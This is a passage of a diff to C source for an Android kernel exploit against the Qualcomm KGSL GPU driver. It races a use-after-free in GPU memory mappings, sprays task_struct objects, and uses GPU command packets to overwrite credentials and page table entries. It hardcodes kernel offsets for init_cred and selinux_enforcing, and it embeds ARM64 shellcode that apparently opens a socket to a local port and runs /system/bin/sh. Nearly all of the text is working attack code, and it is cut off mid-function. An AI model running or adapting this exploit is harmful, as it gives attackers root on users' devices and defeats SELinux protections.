-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-            cmd[dw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
-                wait_timestamp(kgsl_fd, ctx_id, ts);
-            __sync_synchronize();
-            uint32_t uid = *(volatile uint32_t*)dst_m;
-            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
-                uid == 0 ? "OK" : "FAIL");
-        }
-        printf("  Phase 8b: %d creds updated\n", n_ok);
-
-        // 读 after
-        if (n_cred > 0) {
-            printf("[*] Phase 8c: Dumping cred page AFTER write\n");
-            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
-            uint32_t *ccmd = (uint32_t *)ib_m;
-            int cdw = 0;
-            ccmd[cdw++] = cp_type7(CP_NOP, 0);
-            for (int ci = 0; ci < 48; ci++) {
-                uint32_t dl, dh, sl, sh;
-                split64(dst_ga + ci * 4, &dl, &dh);
-                split64(cred_pages[0] + cred_offs[0] + ci * 4, &sl, &sh);
-                ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                ccmd[cdw++] = 0; ccmd[cdw++] = dl; ccmd[cdw++] = dh;
-                ccmd[cdw++] = sl; ccmd[cdw++] = sh;
-            }
-            ccmd[cdw++] = cp_type7(CP_NOP, 0);
-            __sync_synchronize();
-            unsigned int cts;
-            if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
-                wait_timestamp(kgsl_fd, ctx_id, cts);
-                __sync_synchronize();
-                uint32_t *cd = (uint32_t *)dst_m;
-                for (int ci = 0; ci < 48; ci++) {
-                    if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
-                    printf(" %08X", cd[ci]);
+char shellcode[287] = {0xff, 0x03, 0x03, 0xd1, 0xfd, 0x7b, 0x06, 0xa9, 0xfc, 0x6f, 0x07, 0xa9, 0xfa, 0x67, 0x08, 0xa9, 0xf8, 0x5f, 0x09, 0xa9, 0xf6, 0x57, 0x0a, 0xa9, 0xf4, 0x4f, 0x0b, 0xa9, 0xc8, 0x15, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x1f, 0x00, 0x00, 0xf1, 0x01, 0x06, 0x00, 0x54, 0x00, 0x24, 0xa0, 0xf2, 0x01, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0x03, 0x00, 0x80, 0xd2, 0x88, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x1f, 0x00, 0x00, 0xf1, 0x01, 0x05, 0x00, 0x54, 0x40, 0x00, 0x80, 0xd2, 0x21, 0x00, 0x80, 0xd2, 0x02, 0x00, 0x80, 0xd2, 0xc8, 0x18, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf3, 0x03, 0x00, 0xaa, 0xe0, 0x03, 0x13, 0xaa, 0x01, 0x05, 0x00, 0x10, 0x02, 0x02, 0x80, 0xd2, 0x68, 0x19, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x01, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x21, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x03, 0x13, 0xaa, 0x41, 0x00, 0x80, 0xd2, 0xe2, 0x03, 0x1f, 0xaa, 0x08, 0x03, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xe0, 0x02, 0x00, 0x10, 0xf5, 0x03, 0x00, 0xaa, 0x16, 0x00, 0x80, 0xd2, 0xf5, 0x03, 0x00, 0xf9, 0xf6, 0x07, 0x00, 0xf9, 0xe1, 0x03, 0x00, 0x91, 0x02, 0x00, 0x80, 0xd2, 0xa8, 0x1b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x80, 0xd2, 0x01, 0x00, 0x80, 0xd2, 0xc8, 0x0b, 0x80, 0xd2, 0x01, 0x00, 0x00, 0xd4, 0xf4, 0x4f, 0x4b, 0xa9, 0xf6, 0x57, 0x4a, 0xa9, 0xf8, 0x5f, 0x49, 0xa9, 0xfa, 0x67, 0x48, 0xa9, 0xfc, 0x6f, 0x47, 0xa9, 0xfd, 0x7b, 0x46, 0xa9, 0xff, 0x03, 0x03, 0x91, 0xc0, 0x03, 0x5f, 0xd6, 0x02, 0x00, 0x05, 0x39, 0x7f, 0x00, 0x00, 0x01, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00}; 
+int main(int argc, char **argv)
+{   gbuf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    if (gbuf == MAP_FAILED) {
+        perror("mmap");
+        exit(1);
+    }
+    fprintf(stderr, "main  pid = %d, main ppid=%d\n", getpid(),getppid());
+    gbuf[0x888]=0;
+    int pid = fork();
+    if (!pid) {
+        fprintf(stderr,"child1\n");
+        int pid2 = fork();
+        if (!pid2){
+            while(1){
+                if(gbuf[FOUND_PID]==0x12){
+                    sleep(2);
+                    gbuf[CALL_LOGLINE]=0x11;
+                    fprintf(stderr, "child 2 pid = %d, child2 ppid=%d\n", getpid(),getppid());
+                    //__builtin_trap();
+                    return 0;
                 }
-                printf("\n");
-                printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
-                    cd[31], cd[30], cd[1]);
+                usleep(100000);
+                
             }
         }
+        else{
+            //__builtin_trap();
+            while(1){
+                if(gbuf[FOUND_PID]==0x11){
+                    fprintf(stderr, "child 1 pid = %d, child1 ppid=%d\n", getpid(),getppid());
+                    gbuf[FOUND_PID]=0x12;
+                    _exit(1);
+                }
+                sleep(1);
+            } 
+        }
+        
     }
+    
 
-    // ===== Phase 8d: Cache eviction =====
-    printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
-    void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
-        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-    if (ev != MAP_FAILED) {
-        volatile char *p = (volatile char *)ev;
-        for (uint64_t o = 0; o < 0x2000000; o += 64) p[o] = 0;
-        munmap(ev, 0x2000000);
+    fd_shellcode=open("/data/local/tmp/shellcode", O_RDWR | O_CREAT | O_TRUNC,0777);
+    write(fd_shellcode,shellcode,287);
+    
+    char * path = "/system/lib64/libbase.so";
+    fd_lib=open(path,O_RDONLY);
+    if (fd_lib<0) perror("open");
+    
+    if (fstat(fd_lib, &st) < 0) { close(fd_lib); return 0; }
+
+
+
+    spray_ctrl = mmap(NULL,
+                  sizeof(spray_slot_t) * SPRAY_COUNT_MAX,
+                  PROT_READ | PROT_WRITE,
+                  MAP_SHARED | MAP_ANONYMOUS,
+                  -1, 0);
+    if (spray_ctrl == MAP_FAILED) {
+        perror("mmap spray_ctrl");
+        exit(1);
     }
-    sleep(1);
+    memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
+    
 
-    // ===== Phase 9: Wait for root shell =====
-    printf("[*] Phase 9: Waiting for root shell...\n");
-    printf("  parent uid=%u euid=%u\n", getuid(), geteuid());
-    fflush(stdout);
 
-    close(notify_pipe[1]);
+restart: ;
+    unsigned int uaf_id = 0, overlap_id = 0, ph_id = 0;
+    uint64_t uaf_mmapsize = 0, overlap_mmapsize = 0, ph_mmapsize = 0;
+    void *uaf_vma = NULL, *bogus_vma = NULL, *ph_vma = NULL, *overlap_vma = NULL;
+    int success = 0;
+    int retries = 20;
+    uaf_id = overlap_id = ph_id = 0;
+    uaf_mmapsize = overlap_mmapsize = ph_mmapsize = 0;
+    uaf_vma = bogus_vma = ph_vma = overlap_vma = NULL;
+    success = 0;
+    
+    fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
+    if (fd < 0) {
+        perror("open /dev/kgsl-3d0");
+        return 1;
+    }
+    
+    fprintf(stderr, "[1] UAF GPUOBJ_ALLOC\n");
+    struct kgsl_gpuobj_alloc uaf_alloc = {0};
+    uaf_alloc.size = UAF_SIZE;
+    uaf_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
+    uaf_alloc.va_len = 0;
+    
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &uaf_alloc) < 0) {
+        fprintf(stderr, "[!] UAF alloc failed: %s\n", strerror(errno));
+        return 1;
+    }
+    uaf_id = uaf_alloc.id;
+    uaf_mmapsize = uaf_alloc.mmapsize;
+    fprintf(stderr, "    UAF id=%u mmapsize=0x%llx\n", uaf_id,
+            (unsigned long long)uaf_mmapsize);
+    
+    fprintf(stderr, "\n[2] OVERLAP GPUOBJ_ALLOC (no mmap yet)\n");
+    struct kgsl_gpuobj_alloc overlap_alloc = {0};
+    overlap_alloc.size = OVERLAP_SIZE;
+    overlap_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
+    overlap_alloc.va_len = 0;
+    
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap_alloc) < 0) {
+        fprintf(stderr, "[!] OVERLAP alloc failed: %s\n", strerror(errno));
+        return 1;
+    }
+    overlap_id = overlap_alloc.id;
+    overlap_mmapsize = overlap_alloc.mmapsize;
+    fprintf(stderr, "    OVERLAP id=%u mmapsize=0x%llx\n", overlap_id,
+            (unsigned long long)overlap_mmapsize);
+    
+    fprintf(stderr, "\n[3] UAF mmap() at FIXED 0x%llx\n",
+            (unsigned long long)UAF_START);
+    uaf_vma = mmap_gpuobj_fixed(fd, uaf_id, uaf_mmapsize, (void *)(uintptr_t)UAF_START);
+    if (uaf_vma == MAP_FAILED || (uint64_t)uaf_vma != UAF_START) {
+        fprintf(stderr, "[!] UAF mmap failed: %s\n", strerror(errno));
+        return 1;
+    }
+    fprintf(stderr, "    UAF mapped at %p (expected 0x%llx)\n", 
+            uaf_vma, (unsigned long long)UAF_START);
+    
+    // Touch pages
+    for (size_t i = 0; i < uaf_mmapsize; i += PAGE_SIZE) {
+        ((volatile char *)uaf_vma)[i] = 1;
+    }
+    fprintf(stderr, "    Touched %llu pages\n", 
+            (unsigned long long)(uaf_mmapsize / PAGE_SIZE));
+    
+    fprintf(stderr, "\n[4] UAF munmap()\n");
+    fprintf(stderr, "    Note: rbtree entry and IOMMU PTEs remain\n");
+    munmap(uaf_vma, uaf_mmapsize);
+    uaf_vma = NULL;
+    usleep(200);
+    
+    fprintf(stderr, "\n[5] Anonymous mmap at 0x%llx (3 pages)\n",
+            (unsigned long long)BOGUS_START);
+    bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE_SIZE * 3,
+                     PROT_READ | PROT_WRITE,
+                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
+                     -1, 0);
+    if (bogus_vma == MAP_FAILED || (uint64_t)bogus_vma != BOGUS_START) {
+        fprintf(stderr, "[!] BOGUS mmap failed: %s\n", strerror(errno));
+        return 1;
+    }
+    for (int i = 0; i < 3; i++) {
+        ((volatile char *)bogus_vma)[i * PAGE_SIZE] = 1;
+    }
+    fprintf(stderr, "    BOGUS VMA at %p\n", bogus_vma);
+    
+    fprintf(stderr, "\n[6] PLACEHOLDER GPUOBJ_ALLOC\n");
+    struct kgsl_gpuobj_alloc ph_alloc = {0};
+    ph_alloc.size = PLACEH_SIZE;
+    ph_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
+    ph_alloc.va_len = 0;
+    
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ph_alloc) < 0) {
+        fprintf(stderr, "[!] PLACEHOLDER alloc failed: %s\n", strerror(errno));
+        return 1;
+    }
+    ph_id = ph_alloc.id;
+    ph_mmapsize = ph_alloc.mmapsize;
+    fprintf(stderr, "    PLACEHOLDER id=%u mmapsize=0x%llx\n", ph_id,
+            (unsigned long long)ph_mmapsize);
+    
+    fprintf(stderr, "\n[7] PLACEHOLDER mmap() at FIXED 0x%llx\n",
+            (unsigned long long)PLACEH_START);
+    ph_vma = mmap_gpuobj_fixed(fd, ph_id, ph_mmapsize, (void *)(uintptr_t)PLACEH_START);
+    if (ph_vma == MAP_FAILED || (uint64_t)ph_vma != PLACEH_START) {
+        fprintf(stderr, "[!] PLACEHOLDER mmap failed: %s\n", strerror(errno));
+        return 1;
+    }
+    fprintf(stderr, "    PLACEHOLDER mapped at %p (expected 0x%llx)\n", 
+            ph_vma, (unsigned long long)PLACEH_START);
+    
+    // Touch pages
+    for (size_t i = 0; i < ph_mmapsize; i += (PAGE_SIZE * 1024)) {
+        ((volatile char *)ph_vma)[i] = 1;
+    }
+    
 
-    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
-    pid_t winner = 0;
-    if (poll(&pfd, 1, 10000) > 0 &&
-        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
-        printf("[+] ROOT! uid=0 at PID %d\n", winner);
-        for (int i = 0; i < n_spray; i++)
-            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
-        while (waitpid(-1, NULL, WNOHANG) > 0);
-        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
-        fflush(stdout);
-        waitpid(winner, NULL, 0);
-        printf("[-] Root shell exited\n");
+    
+    int mmap_errno = 0;
+    
+    
+    fprintf(stderr, "[8] Main thread will mmap OVERLAP\n\n");
+    
+    race_state_t rs = {
+        .fd = fd,
+        .ready = 0,
+        .bogus_started = 0,
+        .result = -1,
+        .saved_errno = 0
+    };
+    
+    pthread_t bogus_thread;
+    pthread_create(&bogus_thread, NULL, bogus_racer, &rs);
+    
+    rs.ready = 1;
+    __sync_synchronize();
+    
+    // wait for thread
+    int timeout = 0;
+    while (!rs.bogus_started && timeout < 1000) {
+        __asm__ __volatile__("" ::: "memory");
+        timeout++;
+    }
+    
+    // Race window delay 
+    usleep(200);
+    
+    fprintf(stderr, "[9] OVERLAP mmap() at FIXED 0x%llx during race\n",
+            (unsigned long long)OVERLAP_START);
+    
+    // Try race
+    overlap_vma = mmap_gpuobj_fixed(fd, overlap_id, overlap_mmapsize, (void *)(uintptr_t)OVERLAP_START);
+    mmap_errno = errno;
+    
+    pthread_join(bogus_thread, NULL);
+    
+    fprintf(stderr, "    OVERLAP mmap result: %s\n",
+            overlap_vma == MAP_FAILED ? "FAILED" : "SUCCESS");
+    
+    if (overlap_vma == MAP_FAILED) {
+        fprintf(stderr, "      errno=%d (%s)\n", mmap_errno, strerror(mmap_errno));
     } else {
-        printf("[-] No child got uid=0\n");
+        fprintf(stderr, "      mapped at %p (expected 0x%llx)\n",
+                overlap_vma, (unsigned long long)OVERLAP_START);
     }
-    close(notify_pipe[0]);
+    
+    if (overlap_vma == MAP_FAILED && mmap_errno == 19) {  // ENODEV
+        fprintf(stderr, "\n[!] RACE CONDITION WON!\n");
+        success = 1;
+    }
 
-    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
-    while (wait(NULL) > 0);
-    printf("[*] Done. Goodbye.\n");
+
+    if (!success) {
+        fprintf(stderr, "[-] Race failed (errno=%d), retrying...\n", mmap_errno);
+
+        if (overlap_vma != MAP_FAILED && overlap_vma != NULL) {
+            munmap(overlap_vma, overlap_mmapsize);
+        }
+        
+        if (ph_vma != MAP_FAILED && ph_vma != NULL) {
+            munmap(ph_vma, ph_mmapsize);
+        }
+        
+        if (bogus_vma != MAP_FAILED && bogus_vma != NULL) {
+            munmap(bogus_vma, PAGE_SIZE * 3);
+        }
+
+
+        struct kgsl_gpuobj_free free_obj;
+        free_obj.flags = 0; 
+
+        if (overlap_id) {
+            free_obj.id = overlap_id;
+            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
+        }
+        if (ph_id) {
+            free_obj.id = ph_id;
+            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
+        }
+        if (uaf_id) {
+            free_obj.id = uaf_id;
+            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
+        }
+
+
+        if (fd >= 0) {
+            close(fd);
+            fd = -1;
+        }
+
+        retries--;
+        if (retries > 0) {
+            fprintf(stderr, "[-] Retrying exploit... (%d attempts left)\n", retries);
+            sleep(1);
+            goto restart; 
+        } else {
+            fprintf(stderr, "[!] All retries failed. Giving up.\n");
+            return 1;
+        }
+    }
+
+    
+    fprintf(stderr, "[10] Freeing UAF to create dangling PTEs\n");
+    struct kgsl_gpuobj_free uaf_free = {0};
+    uaf_free.id = uaf_id;
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &uaf_free) == 0) {
+        fprintf(stderr, "    UAF freed (id=%u)\n", uaf_id);
+        uaf_id = 0;
+    }
+
+        fprintf(stderr, "\n[11] Spraying task_struct\n");
+        
+        char qwerqwer[0x500] = {0};
+        pid_t spray_pids[SPRAY_COUNT_MAX];
+        fd2 = open("/data/local/tmp/memo", O_RDWR | O_CREAT | O_TRUNC, 0644);
+        write(fd2,qwerqwer,0x500);
+        int spray_success = 0;
+        int fd_zero = -1;
+        fd_zero = open("/data/local/tmp/zeros.bin", O_RDWR | O_CREAT | O_TRUNC, 0644);
+        
+        char buffer_zero[0x100];
+        memset(buffer_zero, 0, sizeof(buffer_zero)); 
+        write(fd_zero, buffer_zero, sizeof(buffer_zero));
+        lseek(fd_zero,0,SEEK_SET);
+        for (int i = 0; i < spray_count; i++) {
+            pid_t pid = fork();
+
+            if (pid == 0) {
+                struct kgsl_gpuobj_free free_obj = {0};
+
+                close(fd);
+
+                // set task name
+                char proc_name[16];  // TASK_COMM_LEN
+                memset(proc_name,0,16);
+                pid_t self = getpid();
+                snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, self);
+                prctl(PR_SET_NAME, proc_name, 0, 0, 0);
+                int idx = i;
+                spray_ctrl[idx].pid=self;
+                spray_ctrl[idx].do_action=0;
+                while(1){
+                    if(spray_ctrl[idx].do_action==1 && gbuf[0]==0xab){
+                        while(1){
+                            if (*(uint64_t *)&gbuf[SET_TASKS] != 0) break;
+                        }
+                        uint64_t rrtt=read(fd_zero,(void *)*(uint64_t *)&gbuf[SET_TASKS],4);
+                        if (rrtt<0){
+                            gbuf[TASK_SPRAY_CLEAR]=0x1;
+                        }
+                        else if(rrtt>0) {
+                            gbuf[TASK_SPRAY_CLEAR]=0x2;
+                        }
+                        else if (rrtt==0){
+                            gbuf[TASK_SPRAY_CLEAR]=0x3;
+                        }
+                        while(1){
+                            return 0;
+                        }
+                        return 0;
+                        
+                    }
+                    sleep(1);
+                }
+            }
+                
+
+            else if (pid > 0){
+                spray_success++;
+            }
+            else{
+                spray_pids[i]=-1;
+            }
+            //usleep(10);
+        }
+
+        fprintf(stderr, "    [+] Sprayed %d processes with names: %s0000 ~ %s%04d\n",
+                spray_success, MARKER_NAME, MARKER_NAME, spray_success - 1);
+        
+        usleep(20);
+        
+        fprintf(stderr, "\n[12] Scanning UAF region for non-zero data\n");
+        struct nonzero_page found_pages[FINDING];
+        int num_found = 0;
+        uint64_t found_va = 0;
+        int found_count = 0;
+
+        if (scan_uaf_for_nonzero_multi(fd, found_pages, &num_found)) {
+            fprintf(stderr, "\n");
+            fprintf(stderr, " NON-ZERO PAGES FOUND IN UAF REGION!\n");
+            fprintf(stderr, "Count: %d pages\n", num_found);
+
+        } else {
+            fprintf(stderr,
+                    "\n    [!] scan_uaf_for_nonzero_multi failed (only_once != 1). Cleaning up and restarting...\n");
+
+            for (int i = 0; i < spray_count; i++) {
+                if (spray_ctrl[i].pid > 0) {
+                    kill(spray_ctrl[i].pid, SIGTERM);
+                }
+            }
+            for (int i = 0; i < spray_count; i++) {
+                if (spray_ctrl[i].pid > 0) {
+                    waitpid(spray_ctrl[i].pid, NULL, 0);
+                }
+            }
+
+            if (fd_zero >= 0) {
+                close(fd_zero);
+                fd_zero = -1;
+            }
+            if (fd2 >= 0) {
+                close(fd2);
+                fd2 = -1;
+            }
+
+            if (overlap_vma && overlap_vma != MAP_FAILED) {
+                munmap(overlap_vma, overlap_mmapsize);
+                overlap_vma = NULL;
+            }
+            if (ph_vma && ph_vma != MAP_FAILED) {
+                munmap(ph_vma, ph_mmapsize);
+                ph_vma = NULL;
+            }
+            if (bogus_vma && bogus_vma != MAP_FAILED) {
+                munmap(bogus_vma, PAGE_SIZE * 3);
+                bogus_vma = NULL;
+            }
+
+            struct kgsl_gpuobj_free free_obj = {0};
+            if (overlap_id) {
+                free_obj.id = overlap_id;
+                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
+                overlap_id = 0;
+            }
+            if (ph_id) {
+                free_obj.id = ph_id;
+                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
+                ph_id = 0;
+            }
+            if (uaf_id) {
+                free_obj.id = uaf_id;
+                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
+                uaf_id = 0;
+            }
+
+            if (fd >= 0) {
+                close(fd);
+                fd = -1;
+            }
+
+            memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
+            if (spray_count + SPRAY_COUNT_STEP <= SPRAY_COUNT_MAX) {
+                spray_count += SPRAY_COUNT_STEP;
+            } else {
+                spray_count = SPRAY_COUNT_MAX;
+            }
+            goto restart;
+        }
+        
+    for (int i = 0; i < spray_count; i++) {
+        if(spray_ctrl[i].do_action==0){
+            kill(spray_ctrl[i].pid,SIGTERM);
+        }
+    }
+    for (int i = 0; i < spray_count; i++) {
+        if(spray_ctrl[i].do_action==0){
+            waitpid(spray_ctrl[i].pid,NULL,0);
+        }
+    }
+    
+
+
+    uint64_t kbase = (*(uint64_t *)&gbuf[0x20]);
+    uint64_t init_cred = kbase + 0x24D90D0;
+    uint64_t poweroff_cmd = kbase+0x2BB8EC0;
+    uint64_t orderly_poweroff = kbase + 0x5F96C;
+    uint64_t memstart_addr = kbase + 0x24C2538;
+    selinux_enforcing = kbase+0x2F74CE8;
+    *(uint64_t *)&gbuf[SET_TASKS]=selinux_enforcing;
+    sleep(1);
+    fprintf(stderr, "child start %lx\n", *(uint64_t *)&gbuf[SET_TASKS]);
+    gbuf[0] = 0xab;
+    while(1){
+        if(gbuf[TASK_SPRAY_CLEAR]==0x1){
+            fprintf(stderr,"child read fail\n");
+            break;
+        }
+        else if (gbuf[TASK_SPRAY_CLEAR]==0x2){
+            fprintf(stderr,"child read success\n");
+            break;
+        }
+        else if (gbuf[TASK_SPRAY_CLEAR]==0x3){
+            fprintf(stderr, "ret is 0\n");
+            break;
+        }
+    }
+    
+    mmap_spray();
+    struct nonzero_page pages2[MAX_FOUND_PAGES];
+    int num_pages2 = 0;
+    if (scan_uaf_and_collect(fd, pages2, &num_pages2)){
+    }
+    else{
+        fprintf(stderr, "[!] No pages found in UAF region\n");
+    }
+    gbuf[0x910]=1;
+    mmap_check();
+    sleep(1); // for context switching
+    fprintf(stderr,"mmap_check complete.\n");
+    uint32_t rb_count = *(uint32_t *)(gbuf+0xb00);
+    struct kgsl_drawctxt_create ctx2 = {
+            .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
+        };
+    if (ioctl(fd,IOCTL_KGSL_DRAWCTXT_CREATE, &ctx2) == 0){
+        unsigned ctx_id2 = ctx2.drawctxt_id;
+        struct kgsl_gpuobj_alloc ib_alloc = {
+            .size = PAGE_SIZE *4,
+            .flags = KGSL_MEMFLAGS_USE_CPU_MAP
+        };
+        if(ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc)==0){
+            unsigned ib_id2 = ib_alloc.id;
+            void * ib_vma2 = mmap(NULL,ib_alloc.mmapsize, PROT_READ | PROT_WRITE , MAP_SHARED ,fd,((off_t)ib_id2) <<12);
+            if (ib_vma2 != MAP_FAILED){
+                struct kgsl_gpuobj_info info ={ .id=ib_id2 };
+                ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+                uint64_t ib_gpu2  = info.gpuaddr;
+
+                struct kgsl_gpuobj_alloc dump_alloc ={
+                    .size = PAGE_SIZE*2,
+                    .flags = KGSL_MEMFLAGS_USE_CPU_MAP
+                };
+                unsigned dump_id = 0;
+                void * dump_vma = NULL;
+                uint64_t dump_gpu = 0;
+                if(ioctl(fd,IOCTL_KGSL_GPUOBJ_ALLOC,&dump_alloc)==0){
+                    dump_id = dump_alloc.id;
+                    dump_vma = mmap(NULL, dump_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)dump_id)<<12);
+                    if (dump_vma != MAP_FAILED){
+                        struct kgsl_gpuobj_info dump_info = {.id=dump_id};
+                        ioctl(fd,IOCTL_KGSL_GPUOBJ_INFO,&dump_info);
+                        dump_gpu = dump_info.gpuaddr;
+                        
+                    }
+                    else{
+                        dump_vma=NULL;
+                    }
+                }
+                else{
+                    fprintf(stderr,"dump_alloc");
+                }
+
+                fprintf(stderr, "rb_count: %u\n", rb_count);
+                for(uint32_t ri = 0; ri < rb_count; ri++){
+                    uint64_t va = *(uint64_t *)(gbuf + 0xb08 + ri * 24);
+                    fprintf(stderr, "VA : %llx\n", (unsigned long long)va);
+                    uint32_t *cmd = (uint32_t *)ib_vma2;
+                    int dw = 0;
+                    uint32_t d_lo, d_hi, s_lo, s_hi;
+                    fprintf(stderr,"check1\n");
+                    memset(ib_vma2,0,ib_alloc.mmapsize);
+                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
+                    if (dump_vma){
+                        fprintf(stderr, "dump_vma %p\n", dump_vma);
+                        for(int i_dump = 0; i_dump < 0x80; i_dump++){
+                            split64(dump_gpu + (uint64_t)i_dump * 4, &d_lo, &d_hi);
+                            split64(va + (uint64_t)i_dump * 4, &s_lo, &s_hi);
+                            cmd[dw++] =cp_type7_packet(CP_MEM_TO_MEM,5);
+                            cmd[dw++] = 0;
+                            cmd[dw++] = d_lo;
+                            cmd[dw++] = d_hi;
+                            cmd[dw++] = s_lo;
+                            cmd[dw++] = s_hi;
+                        }
+                    }
+                    else{
+                        fprintf(stderr,"WWDDWFWEFE");
+                    }
+                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
+
+                    size_t bytes = (size_t)dw * 4;
+                    msync(ib_vma2, bytes, MS_SYNC);
+                    struct kgsl_command_object obj = {
+                        .gpuaddr=ib_gpu2,
+                        .size = bytes,
+                        .flags = KGSL_CMDLIST_IB,
+                        .id = ib_id2
+                    };
+
+                    struct kgsl_gpu_command c = {0};
+                    c.cmdlist = (uint64_t)(uintptr_t)&obj;
+                    c.cmdsize = sizeof(obj);
+                    c.numcmds = 1;
+                    c.context_id = ctx_id2;
+
+                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND,&c) != 0 || wait_timestamp(fd, ctx_id2, c.timestamp) != 0 ){
+                        fprintf(stderr,
+                                "       [!] GPU copy failed (read) for VA 0x%llx\n",
+                                (unsigned long long)va);
+                        continue;
+                    }
+
+                    if(!dump_vma) continue;
+                    msync(dump_vma, 0x200, MS_SYNC | MS_INVALIDATE);
+                    write(fd2,dump_vma,0x200);
+                    write(fd2,"aaaaaaaaaaaaaaa",0x10);
+                    uint64_t orig =  *(uint64_t *)((uint8_t *)dump_vma + 8*sig_num[0]);
+                    uint64_t pte1 = *(uint64_t *)((uint8_t *)dump_vma + 8*sig_num[1]);
+                    uint64_t src = *(uint64_t *)((uint8_t *)dump_vma + 0x130);
+
+                    const uint64_t PFN_MASK = PHYS_MASK & PAGE_MASK;
+                    uint64_t orig_pfn = orig & PFN_MASK;
+                    uint64_t pte1_pfn = pte1 & PFN_MASK;
+                    uint64_t src_pfn = src & PFN_MASK;
+
+                    if (src_pfn == 0){
+                        fprintf(stderr,
+                                "       [!] Skip patch: src PFN at 0x130 is empty VA : 0x%llx\n",
+                                (unsigned long long)va);
+                        continue;
+                    }
+                    uint64_t new_pte = (orig & ~PFN_MASK) | src_pfn;
+                    uint64_t copied_pfn = src_pfn;
+                    memset(ib_vma2, 0 , ib_alloc.mmapsize);
+                    dw = 0;
+                    cmd = (uint32_t *)ib_vma2;
+
+                    for (int i=0; i<4; i++){
+                        cmd[dw++] = cp_type7_packet(CP_NOP,0);
+                    }
+                    split64(va+ (uint64_t)sig_num[0]*8 ,&d_lo,&d_hi);
+                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE,3);
+                    cmd[dw++] = d_lo;
+
+                    cmd[dw++] = d_hi;
+                    cmd[dw++] = (uint32_t) (new_pte & 0xffffffffu);
+
+                    split64(va+4+(uint64_t)sig_num[0]*8 , &d_lo, &d_hi);
+                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE,3);
+                    cmd[dw++] = d_lo;
+                    cmd[dw++] = d_hi;
+                    cmd[dw++] = (uint32_t)(new_pte >>32);
+                    for(int i=0;i<4;i++){
+                        cmd[dw++] = cp_type7_packet(CP_NOP,0);
+                    }
+                    bytes = (size_t)dw * 4;
+                    msync(ib_vma2, bytes , MS_SYNC);
+                    obj.size = bytes;
+                    memset(&c,0,sizeof(c));
+                    c.cmdlist = (uint64_t)(uintptr_t)&obj;
+                    c.cmdsize = sizeof(obj);
+                    c.numcmds = 1;
+                    c.context_id = ctx_id2;
+
